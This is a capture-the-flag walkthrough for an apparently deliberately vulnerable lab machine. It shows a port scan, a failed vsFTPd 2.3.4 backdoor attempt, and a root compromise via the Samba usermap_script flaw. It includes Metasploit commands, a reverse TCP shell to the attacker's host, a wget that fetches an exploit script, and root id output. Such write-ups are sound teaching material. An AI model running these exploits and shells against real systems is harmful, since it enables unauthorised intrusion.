Initial Observations
The port scan surfaces several high-value vectors for exploration:

Port 21 (FTP): Running vsFTPd 2.3.4. Crucially, the ftp-anon script confirms that anonymous authentication is allowed.  
Port 22 (SSH): Running an older OpenSSH 4.7p1.  
Ports 139/445 (SMB): Managed by an outdated Samba smbd 3.0.20-Debian stack.

The vsFTPd 2.3.4 Backdoor Bottleneck
Researching historical flaws for vsFTPd 2.3.4 pointed directly to a notorious embedded backdoor flaw (exploit/unix/ftp/vsftpd_234_backdoor).
However, executing the exploit sequence through Metasploit constantly threw structural connectivity timeouts:

```text
[!] 10.129.18.214:21 - Unable to connect to backdoor on 6200/TCP. Cooldown?
```

Toggling the AutoCheck data fields between true/false and trying multiple payload structural classes brought no change.
To determine if the framework itself was introducing anomalies, we sourced a standalone Python exploit variant via GitHub:

```text
wget -q [https://raw.githubusercontent.com/chacka0101/exploits/refs/heads/master/Python-Vsftpd-2.3.4-Exploit.py](https://raw.githubusercontent.com/chacka0101/exploits/refs/heads/master/Python-Vsftpd-2.3.4-Exploit.py)
```

Running the independent script returned identical socket connection timeouts:

```text
[+] SUCCESSFUL CONNECTİON
[!] Failed to connect to backdoor
timed out
```

Even resetting the target container from the platform dashboard did not fix the problem.

Pivoting to Samba 3.0.20 (usermap_script)
Since the network transport layer for the backdoor was blocked, we turned to the exposed Samba stack running version 3.0.20.
This variant is vulnerable to arbitrary remote code execution via shell metacharacters handled within the "username map script" setting (CVE-2007-2447).
We loaded the module exploit/multi/samba/usermap_script in Metasploit, bound our configurations to the current internal routing map (tun0), and executed:

```terminal
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set RHOSTS 10.129.18.217
RHOSTS => 10.129.18.217
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set LHOST tun0
LHOST => 10.10.16.205
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> run
[*] Started reverse TCP handler on 10.10.16.205:4444 
[*] Command shell session 1 opened (10.10.16.205:4444 -> 10.129.18.217:54009)

id
uid=0(root) gid=0(root)
```

The shell caught successfully, granting instant root-level access privileges without requiring additional local privilege escalation steps.

With full system access, we extracted the respective operational proof flags:

```text
cat /home/makis/user.txt
cat /root/root.txt
```

Post-Exploitation Debrief: Why Did vsFTPd Fail?
To understand why the vsFTPd backdoor failed, we reviewed the active sockets and security policies inside the system.
Running a loop test locally on the target loopback interface showed that connections to port 6200 were dropped directly by an internal network filter:

```text
(UNKNOWN) [127.0.0.1] 6200 (?) : Connection refused
```

Even when explicitly binding a handler (nc) to listen, the shell was prevented from establishing external states:

```text
tcp        0      0 0.0.0.0:6200            0.0.0.0:* LISTEN      8848/sh
```
